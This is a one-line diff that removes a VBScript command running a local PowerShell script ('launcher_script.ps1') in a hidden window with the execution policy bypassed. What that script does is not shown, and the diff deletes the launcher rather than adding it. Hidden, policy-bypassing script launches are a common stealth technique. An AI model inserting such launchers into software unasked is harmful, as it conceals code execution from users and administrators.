@@ -1,1 +1,0 @@
-CreateObject("WScript.Shell").Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy ByPass -File launcher_script.ps1", 0
